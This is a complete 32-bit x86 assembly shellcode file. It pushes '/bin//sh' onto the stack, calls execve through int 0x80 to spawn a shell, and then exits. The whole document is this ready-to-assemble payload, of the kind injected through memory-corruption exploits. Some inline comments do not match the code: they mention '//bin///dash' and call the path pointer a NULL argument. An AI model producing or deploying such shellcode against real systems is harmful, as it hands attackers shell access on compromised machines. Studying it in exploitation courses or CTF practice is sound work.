bits 32

shellcode:
	xor eax, eax ; init register to 0
	xor ebx, ebx ; //
	xor ecx, ecx ; //
	xor edx, edx ; //

	mov al, 11 ; set execve function
	
	push ebx ; set "//bin///dash\0" in arg 0
	push '//sh'
	push '/bin'

	mov ebx, esp ; set NULL in arg 1

	int 0x80 ; syscall

	mov al, 1 ; set exit function

	xor ebx, ebx ; exit return to 0
	 
	int 0x80 ; syscall
